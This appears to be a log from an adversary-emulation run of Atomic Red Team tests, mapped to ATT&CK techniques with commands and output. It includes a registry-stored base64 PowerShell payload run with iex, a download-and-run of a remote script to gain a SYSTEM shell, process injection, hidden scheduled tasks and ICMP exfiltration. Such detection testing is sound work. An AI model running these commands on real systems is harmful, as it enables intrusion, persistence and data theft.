460,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['PowerShell Fileless Script Execution'],execution :: T1059.001,operation__atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__50df8303a555242bea67342db40d0d47__SAVED_2024-03-07_034558,atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__50df8303a555242bea67342db40d0d47,['50df8303a555242bea67342db40d0d47'],1,0,1,[1],['The operation completed successfully.\r'],[''],['0'],"['reg.exe add ""HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp \'HKCU:\\Software\\Classes\\AtomicRedTeam\').ART)))']","['Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open ""C:\\Windows\\Temp"" and verify that\nart-marker.txt is in the folder.\n']",['PowerShell Fileless Script Execution'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
465,Initial-Success,discovery,discovery :: Process Discovery,discovery :: ['Process Discovery - Get-Process'],discovery :: T1057,operation__atomic_windows_depfalse_pshtrue__t1057__discovery__process_discovery__1d48fc4147a7bcd47bdf60db7dde9640__SAVED_2024-03-07_030552,atomic_windows_depfalse_pshtrue__t1057__discovery__process_discovery__1d48fc4147a7bcd47bdf60db7dde9640,['1d48fc4147a7bcd47bdf60db7dde9640'],1,0,1,[1],['Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  -------  ------    -----      -----     ------     --  -- -----------                                                      284      17     6664      26248       0.30   6560   1 ApplicationFrameHost                                             168      10     6220       9912       2.41   5056   0 audiodg                                                          129       9     3388       8440       0.00   6216   1 cmd                                                               72       5     3032       4720       0.06   8164   1 cmd                                                              121      10     6660      15044       0.09    956   1 conhost                                                          187      12     7156      18332       4.50   5152   1 conhost                                                          259      13    10348      23512       0.27   7104   1 conhost                                                          537      22     1856       5524       0.16    444   0 csrss                                                            390      18     1932       5572       0.84    532   1 csrss                                                            457      17     4344      21396       0.28   4136   1 ctfmon                                                           312      14     2560       9176       0.05   3088   0 dasHost                                                          260      17     4044      12404       0.06   7252   1 dllhost                                                          151       9     2068      12844       0.03   8620   1 dllhost                                                          936      48    35136      66256       2.89   1016   1 dwm                                                             2376      88    59556     140104       3.91   4700   1 explorer                                                          36       5     1272       3352       0.03    780   0 fontdrvhost                                                       36       6     1656       4588       0.06    792   1 fontdrvhost                                                        0       0       60          8                 0   0 Idle                                                             661      47  1385504    1065124      73.61   8068   1 java                                                            1355      26     7756      22068       1.28    676   0 lsass                                                              0       0       56         12       0.02   1768   0 Memory Compression                                               303      18    10784      25228       0.73     64   0 MoUsoCoreWorker                                                  684      89   262652     196984      19.89   3080   0 MsMpEng                                                         1567      98    46792     146772       1.22   8812   1 PhoneExperienceHost                                              503      26    69844      74124       0.23    452   1 powershell                                                       273      18    11872      24740       0.11    628   1 python3.10                                                       247      15    17324       2484       0.27   1888   0 pythonw                                                            0      15    14356      26656       1.78     92   0 Registry                                                         609      27    12804      40804       1.00   5444   1 RuntimeBroker                                                    272      16     3860      24052       0.14   5708   1 RuntimeBroker                                                    324      17     4192      23212       0.48   6396   1 RuntimeBroker                                                    307      15     3704      23380       0.08   7800   1 RuntimeBroker                                                   1818     157   203668     284852      11.67   5952   1 SearchApp                                                        170       9     2080       9276       0.02   6200   0 SearchFilterHost                                                 802      72    28192      34892       1.47   2720   0 SearchIndexer                                                    355      13     2624      11220       0.03   3580   0 SearchProtocolHost                                               617      19     6004      20328       0.45   7508   0 SecurityHealthService                                            168       9     1724       9128       0.05   7480   1 SecurityHealthSystray                                            655      13     5004      10220       0.81    640   0 services                                                         105       7     4560       7172       0.00   8880   0 SgrmBroker                                                       689      31    15484      60272       1.06   7984   1 ShellExperienceHost                                              625      20     7224      31080       0.47   3652   1 sihost                                                           441     219   103604     116756      40.06   6484   0 SilkService                                                      406      22     7832      22884       0.08   7428   1 smartscreen                                                       53       3     1084       1212       0.03    340   0 smss                                                             132      11    18428      10172       0.11   3180   1 splunkd                                                          456      25     5456      16104       0.05   2332   0 spoolsv                                                          120      11     1956       7380       0.00   2624   0 sshd                                                             715      33    21580      71184       0.63   5568   1 StartMenuExperienceHost                                          142       9     1652      11264       0.03    324   0 svchost                                                          214      13     2688      11828       0.05    396   0 svchost                                                          182      10     1956       8004       0.05    400   0 svchost                                                          156       7     1540       6304       0.03    592   0 svchost                                                         1619      22    10860      29216       1.31    772   0 svchost                                                         1164      21     8016      16356       3.73    888   0 svchost                                                          260      11     2372       8368       0.16    932   0 svchost                                                          115       8     1408       5604       0.00   1048   0 svchost                                                          214      12     2192      10104       0.05   1056   0 svchost                                                          282      10     2104      12136       0.03   1068   0 svchost                                                          419      18     6560      15968       0.53   1236   0 svchost                                                          396      15    19056      22408       0.41   1252   0 svchost                                                          122       8     1480       7368       0.00   1264   0 svchost                                                          248      13     3300      13984       0.09   1352   0 svchost                                                          143      20     5220       9480       0.08   1360   0 svchost                                                          270      10     2692      10040       0.27   1448   0 svchost                                                          222      10     2080       7688       0.08   1456   0 svchost                                                          145      10     1728       8188       0.09   1532   0 svchost                                                          387      14     3948      11476       0.05   1580   0 svchost                                                          170       9     1900       7820       0.02   1684   0 svchost                                                          235      16    91472     100372      13.25   1704   0 svchost                                                          173       7     1348       6040       0.03   1720   0 svchost                                                          172      11     1876       8408       0.02   1804   0 svchost                                                          174       9     1852       8152       0.06   1828   0 svchost                                                          146       9     1972       7936       0.06   1840   0 svchost                                                          463      12     2956       9904       0.28   1868   0 svchost                                                          176      10     1948       7612       0.13   1988   0 svchost                                                          354      13     3044      13880       0.03   2008   0 svchost                                                          232      12     2380      11804       0.03   2016   0 svchost                                                          190       9     5876      14968       3.84   2060   0 svchost                                                          270      13     2924       8344       0.16   2072   0 svchost                                                          365      14     2504       9768       0.05   2092   0 svchost                                                          136      10     1676       6608       0.05   2108   0 svchost                                                          193      12     2176      12780       0.00   2184   0 svchost                                                          437      32     9172      18536       0.70   2380   0 svchost                                                          414      21     5240      17536       0.19   2388   0 svchost                                                          407      15    10516      20472       0.80   2400   0 svchost                                                          726      81    50260      29944      10.64   2456   0 svchost                                                          183      10     1968       8320       0.02   2516   0 svchost                                                          364      16     2804      11100       0.13   2596   0 svchost                                                          128       7     1324       5868       0.02   2848   0 svchost                                                          264      14     2620       8128       0.00   2852   0 svchost                                                          164      12     1776       7428       0.03   2884   0 svchost                                                          138       8     1416       6624       0.02   2908   0 svchost                                                          374      26     4320      14144       0.28   2920   0 svchost                                                          570      26    18716      37536       1.89   2948   0 svchost                                                          329      17     8464      16500       0.50   2960   0 svchost                                                          206      12     2376       9380       0.02   3004   0 svchost                                                          136       9     1656       6972       0.03   3040   0 svchost                                                          394      19     4800      21548       0.09   3112   0 svchost                                                          506      29     9576      20624       0.17   3220   0 svchost                                                          250      13     3324      18660       0.06   3264   1 svchost                                                          109       7     1344       5696       0.03   3272   0 svchost                                                          385      24     3536      13188       0.03   3448   0 svchost                                                          171       9     1916       8236       0.00   3480   0 svchost                                                          378      18     9280      32824       0.42   3736   1 svchost                                                          222      12     2724      11272       0.13   3744   0 svchost                                                          230      15     2096       7636       0.02   3816   0 svchost                                                          554      25     9600      39228       0.61   3828   1 svchost                                                          301      14     4012      22120       1.02   4048   0 svchost                                                          397      25    23884      43204      10.38   4232   0 svchost                                                          128       8     2896       8176       0.06   4324   0 svchost                                                          202      11     2048       8600       0.02   4848   0 svchost                                                          329      19     4268      16344       0.08   5032   0 svchost                                                          216      13     2684      12368       0.27   5076   0 svchost                                                          429      15     6200      22648       0.17   5196   0 svchost                                                          408      19     5052      17836       0.13   5780   0 svchost                                                          133       9     1704       7920       0.02   5860   0 svchost                                                          383      17     4888      17456       0.38   6160   0 svchost                                                          316      17     4352      23524       0.06   6748   0 svchost                                                          120       8     1388       5928       0.02   6892   0 svchost                                                          199      11     3732       8768       0.00   6920   0 svchost                                                          235      13     2688      12748       0.06   7548   0 svchost                                                          280      13     2540      12420       0.06   7856   0 svchost                                                          458      25     5844      21792       0.20   8056   1 svchost                                                          219      13     1896       8404       0.00   8676   0 svchost                                                          220      12     2844      10904       0.03   9148   0 svchost                                                         2670       0      196        148      14.55      4   0 System                                                           304      40     8700      19172       0.25   3980   1 taskhostw                                                        327      19     4636      15504       0.09   4004   1 taskhostw                                                        542      22     8940      39088       0.14    388   1 TextInputHost                                                    114       7     1276       6392       0.02   6168   0 uhssvc                                                           164      11     1536       7312       0.05    520   0 wininit                                                          276      12     2560      12132       0.05    616   1 winlogon                                                         259      16     4848      14540       0.05   3056   0 WmiPrvSE                                                     '],[''],['0'],['Get-Process'],"['Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n']",['Process Discovery - Get-Process'],"[{'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
475,Initial-Success,multiple,multiple :: Process Injection: Portable Executable Injection,multiple :: ['Portable Executable Injection'],multiple :: T1055.002,operation__atomic_windows_depfalse_pshtrue__t1055_002__multiple__process_injection-_portable_executable_injection__ca6a3f579181ea47b7d95779e8d8a79b__SAVED_2024-03-07_015259,atomic_windows_depfalse_pshtrue__t1055_002__multiple__process_injection-_portable_executable_injection__ca6a3f579181ea47b7d95779e8d8a79b,['ca6a3f579181ea47b7d95779e8d8a79b'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Start-Process ""971b85_RedInjection.exe""; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force']","['This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title ""Warning"" and the content ""Atomic Red Team"" after a few seconds.']",['Portable Executable Injection'],"[{'tactic': 'multiple', 'technique_name': 'Process Injection: Portable Executable Injection', 'technique_id': 'T1055.002'}]",['windows'],['psh']
476,Initial-Success,multiple,multiple :: Process Injection: Dynamic-link Library Injection,multiple :: ['WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique'],multiple :: T1055.001,operation__atomic_windows_depfalse_pshtrue__t1055_001__multiple__process_injection-_dynamic-link_library_injection__c1392878b0e39a2060e7e1b70e5a580b__SAVED_2024-03-07_014617,atomic_windows_depfalse_pshtrue__t1055_001__multiple__process_injection-_dynamic-link_library_injection__c1392878b0e39a2060e7e1b70e5a580b,['c1392878b0e39a2060e7e1b70e5a580b'],1,0,1,[1],['Dropping WindowsCoreDeviceInfo.dll in System32 Folder...Loading DLL with Usoclient StartScanLoading DLL with Usoclient StartDownloadLoading DLL with Usoclient StartInteractiveScan'],[''],['0'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')""]",['Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn'],['WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique'],"[{'tactic': 'multiple', 'technique_name': 'Process Injection: Dynamic-link Library Injection', 'technique_id': 'T1055.001'}]",['windows'],['psh']
477,Initial-Success,multiple,multiple :: Scheduled Task/Job: Scheduled Task,multiple :: ['Powershell Cmdlet Scheduled Task'],multiple :: T1053.005,"operation__atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__ba8ddc38c7c6ced12fecc0d695c5e57c__SAVED_2024-03-07_013230","atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__ba8ddc38c7c6ced12fecc0d695c5e57c",['ba8ddc38c7c6ced12fecc0d695c5e57c'],1,0,1,[1],['TaskPath                                       TaskName                          State     --------                                       --------                          -----     \\                                              AtomicTask                        Ready     '],[''],['0'],"['$Action = New-ScheduledTaskAction -Execute ""calc.exe""; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\\Administrators"" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object']","['Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n']",['Powershell Cmdlet Scheduled Task'],"[{'tactic': 'multiple', 'technique_name': 'Scheduled Task/Job: Scheduled Task', 'technique_id': 'T1053.005'}]",['windows'],['psh']
478,Initial-Success,multiple,multiple :: Scheduled Task/Job: Scheduled Task,multiple :: ['PowerShell Modify A Scheduled Task'],multiple :: T1053.005,"operation__atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__4150ef18184112953ae5742a3f8de64e__SAVED_2024-03-07_010545","atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__4150ef18184112953ae5742a3f8de64e",['4150ef18184112953ae5742a3f8de64e'],1,0,1,[1],['TaskPath                                       TaskName                          State     --------                                       --------                          -----     \\                                              AtomicTaskModifed                 Ready     \\                                              AtomicTaskModifed                 Ready     '],[''],['0'],"['$Action = New-ScheduledTaskAction -Execute ""cmd.exe""; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\\Administrators"" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""; Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction']","['Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n']",['PowerShell Modify A Scheduled Task'],"[{'tactic': 'multiple', 'technique_name': 'Scheduled Task/Job: Scheduled Task', 'technique_id': 'T1053.005'}]",['windows'],['psh']
480,Initial-Success,multiple,multiple :: Scheduled Task/Job: Scheduled Task,multiple :: ['WMI Invoke-CimMethod Scheduled Task'],multiple :: T1053.005,"operation__atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__54b98f924ee4613c7d927a3ea1dd260a__SAVED_2024-03-07_011226","atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__54b98f924ee4613c7d927a3ea1dd260a",['54b98f924ee4613c7d927a3ea1dd260a'],1,0,1,[1],"['cmdletOutput                                                    ReturnValue PSComputerName------------                                                    ----------- --------------MSFT_ScheduledTask (TaskName = ""T1053_005_WMI"", TaskPath = ""\\"")           0               ']",[''],['0'],"['$xml = [System.IO.File]::ReadAllText(""2cc1c4_T1053_005_WMI.xml""); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\\Microsoft\\Windows\\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }']",['Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n'],['WMI Invoke-CimMethod Scheduled Task'],"[{'tactic': 'multiple', 'technique_name': 'Scheduled Task/Job: Scheduled Task', 'technique_id': 'T1053.005'}]",['windows'],['psh']
481,Initial-Success,multiple,multiple :: Scheduled Task/Job: Scheduled Task,multiple :: ['Import XML Schedule Task with Hidden Attribute'],multiple :: T1053.005,"operation__atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__5e744dc6fc70da028ccd50f7e73ee0be__SAVED_2024-03-07_011907","atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__5e744dc6fc70da028ccd50f7e73ee0be",['5e744dc6fc70da028ccd50f7e73ee0be'],1,0,1,[1],"['cmdletOutput                                                      ReturnValue PSComputerName------------                                                      ----------- --------------MSFT_ScheduledTask (TaskName = ""atomic red team"", TaskPath = ""\\"")           0               ']",[''],['0'],"['$xml = [System.IO.File]::ReadAllText(""54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml""); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\\Microsoft\\Windows\\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }']",['Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n'],['Import XML Schedule Task with Hidden Attribute'],"[{'tactic': 'multiple', 'technique_name': 'Scheduled Task/Job: Scheduled Task', 'technique_id': 'T1053.005'}]",['windows'],['psh']
482,Initial-Success,discovery,discovery :: System Network Connections Discovery,discovery :: ['System Network Connections Discovery with PowerShell'],discovery :: T1049,operation__atomic_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__8ed60dceb98746f1da6214f4f6af7164__SAVED_2024-03-07_005908,atomic_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__8ed60dceb98746f1da6214f4f6af7164,['8ed60dceb98746f1da6214f4f6af7164'],1,0,1,[1],['LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting------------                        --------- -------------                       ---------- -----       --------------::                                  49883     ::                                  0          Bound                     ::                                  49882     ::                                  0          Bound                     ::                                  49881     ::                                  0          Bound                     ::                                  49880     ::                                  0          Bound                     ::                                  49875     ::                                  0          Bound                     ::1                                 49883     ::1                                 5444       Established Internet      ::1                                 49882     ::1                                 5444       Established Internet      ::1                                 49881     ::1                                 5444       Established Internet      ::1                                 49880     ::1                                 5444       Established Internet      ::                                  49670     ::                                  0          Listen                    ::                                  49669     ::                                  0          Listen                    ::                                  49668     ::                                  0          Listen                    ::                                  49667     ::                                  0          Listen                    ::                                  49666     ::                                  0          Listen                    ::                                  49665     ::                                  0          Listen                    ::                                  49664     ::                                  0          Listen                    ::                                  7680      ::                                  0          Listen                    ::1                                 5444      ::1                                 49883      Established Internet      ::1                                 5444      ::1                                 49882      Established Internet      ::1                                 5444      ::1                                 49881      Established Internet      ::1                                 5444      ::1                                 49880      Established Internet      ::                                  5444      ::                                  0          Listen                    ::                                  445       ::                                  0          Listen                    ::                                  135       ::                                  0          Listen                    ::                                  22        ::                                  0          Listen                    0.0.0.0                             49903     0.0.0.0                             0          Bound                     0.0.0.0                             49888     0.0.0.0                             0          Bound                     0.0.0.0                             49887     0.0.0.0                             0          Bound                     0.0.0.0                             49886     0.0.0.0                             0          Bound                     0.0.0.0                             49885     0.0.0.0                             0          Bound                     0.0.0.0                             49874     0.0.0.0                             0          Bound                     0.0.0.0                             49873     0.0.0.0                             0          Bound                     0.0.0.0                             49872     0.0.0.0                             0          Bound                     0.0.0.0                             49871     0.0.0.0                             0          Bound                     0.0.0.0                             49863     0.0.0.0                             0          Bound                     0.0.0.0                             49858     0.0.0.0                             0          Bound                     0.0.0.0                             49856     0.0.0.0                             0          Bound                     0.0.0.0                             49753     0.0.0.0                             0          Bound                     192.168.122.229                     49903     192.168.122.1                       8888       Established Internet      192.168.122.229                     49902     13.107.42.16                        443        TimeWait                  192.168.122.229                     49900     20.106.86.13                        443        TimeWait                  192.168.122.229                     49899     10.32.139.114                       1100       TimeWait                  192.168.122.229                     49898     72.21.81.240                        80         TimeWait                  192.168.122.229                     49897     72.21.81.240                        80         TimeWait                  192.168.122.229                     49896     72.21.81.240                        80         TimeWait                  192.168.122.229                     49893     23.51.57.215                        80         TimeWait                  192.168.122.229                     49892     13.107.42.16                        443        TimeWait                  192.168.122.229                     49890     23.44.133.53                        80         TimeWait                  192.168.122.229                     49889     23.44.133.57                        80         TimeWait                  192.168.122.229                     49888     23.44.133.39                        80         Established Internet      192.168.122.229                     49887     23.199.50.75                        443        Established Internet      192.168.122.229                     49886     23.199.50.75                        443        Established Internet      192.168.122.229                     49885     23.199.50.75                        443        Established Internet      192.168.122.229                     49875     128.226.117.212                     9200       Established Internet      192.168.122.229                     49874     52.159.127.243                      443        Established Internet      192.168.122.229                     49873     23.48.224.108                       443        CloseWait   Internet      192.168.122.229                     49872     23.48.224.108                       443        CloseWait   Internet      192.168.122.229                     49871     23.48.224.108                       443        CloseWait   Internet      192.168.122.229                     49863     23.48.224.104                       443        Established Internet      192.168.122.229                     49858     131.253.33.200                      443        Established Internet      192.168.122.229                     49856     204.79.197.222                      443        Established Internet      192.168.122.229                     49854     104.66.243.145                      80         TimeWait                  127.0.0.1                           49753     127.0.0.1                           49752      Established Internet      127.0.0.1                           49752     127.0.0.1                           49753      Established Internet      0.0.0.0                             49670     0.0.0.0                             0          Listen                    0.0.0.0                             49669     0.0.0.0                             0          Listen                    0.0.0.0                             49668     0.0.0.0                             0          Listen                    0.0.0.0                             49667     0.0.0.0                             0          Listen                    0.0.0.0                             49666     0.0.0.0                             0          Listen                    0.0.0.0                             49665     0.0.0.0                             0          Listen                    0.0.0.0                             49664     0.0.0.0                             0          Listen                    0.0.0.0                             9900      0.0.0.0                             0          Listen                    127.0.0.1                           9600      0.0.0.0                             0          Listen                    0.0.0.0                             5040      0.0.0.0                             0          Listen                    0.0.0.0                             5000      0.0.0.0                             0          Listen                    192.168.122.229                     139       0.0.0.0                             0          Listen                    0.0.0.0                             135       0.0.0.0                             0          Listen                    0.0.0.0                             22        0.0.0.0                             0          Listen                    '],[''],['0'],['Get-NetTCPConnection'],"['Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n']",['System Network Connections Discovery with PowerShell'],"[{'tactic': 'discovery', 'technique_name': 'System Network Connections Discovery', 'technique_id': 'T1049'}]",['windows'],['psh']
487,Initial-Success,exfiltration,exfiltration :: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,exfiltration :: ['Exfiltration Over Alternative Protocol - ICMP'],exfiltration :: T1048.003,"operation__atomic_windows_depfalse_pshtrue__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6baab84fe7a52dd5c4ede612fc0d255f__SAVED_2024-03-07_003236","atomic_windows_depfalse_pshtrue__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6baab84fe7a52dd5c4ede612fc0d255f",['6baab84fe7a52dd5c4ede612fc0d255f'],1,0,1,[1],"['Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {77, 90, 144, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 21, 98, 60...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {57, 24, 116, 10...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 72, 129, 196...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 77, 139, 249...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 72, 141, 140...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 76, 141, 5...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 76, 139, 198...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {15, 72, 141, 84...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {204, 204, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {36, 32, 137, 125...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {65, 131, 192, 8...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {2, 0, 72, 139...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 21, 234, 44...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {196, 32, 65, 95...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {2, 0, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 0, 0, 76...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {199, 1, 0, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {0, 72, 59, 223...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {117, 119, 72, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 139, 206, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {233, 7, 65, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {5, 107, 156, 2...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 51, 196, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {255, 72, 255, 21...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 137, 92, 36...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {116, 5, 232, 37...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {64, 83, 72, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {199, 72, 137, 116...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {21, 235, 236, 1...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {93, 195, 204, 204...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 139, 1, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {54, 0, 0, 232...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {15, 133, 88, 6...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {36, 209, 1, 0...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {120, 2, 0, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {137, 53, 90, 131...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {84, 36, 72, 72...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {194, 15, 132, 94...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 139, 203, 232...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {72, 141, 77, 15...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {124, 36, 40, 69...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {8, 72, 137, 124...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {220, 65, 139, 215...}Status        : SuccessAddress       : 127.0.0.1RoundtripTime : 0Options       : System.Net.NetworkInformation.PingOptionsBuffer        : {31, 